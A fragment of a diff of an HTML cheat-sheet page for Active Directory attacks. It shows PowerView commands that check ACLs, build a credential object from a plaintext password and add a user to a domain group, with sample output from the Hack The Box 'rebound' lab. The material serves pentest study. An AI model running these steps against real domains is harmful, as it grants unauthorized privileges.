 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity '<span class="o">&lt;TARGET_USER&gt;</span>' -Where 'SecurityIdentifier contains <span class="o">&lt;USER&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -Where 'SecurityIdentifier contains <span class="o editable-keyword">&lt;USER&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
 </span></span></span><span class="line"><span class="cl"><span class="go">ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
@@ -395,19 +266,19 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
 </span></span></span></div></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
-<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o">&lt;DOMAIN&gt;</span>\<span class="o">&lt;USER&gt;</span>'</span>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>'</span>
 </span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
 </span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><h4 id="3-add-self-to-group">3. Add self to group</h4>
-<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>' -Members '<span class="o">&lt;USER&gt;</span>' -Credential $Cred
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>' -Members '<span class="o editable-keyword">&lt;USER&gt;</span>' -Credential $Cred
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
 </span></span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>'
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainGroupMember -Identity 'security engineers'
 </span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity 'security engineers'
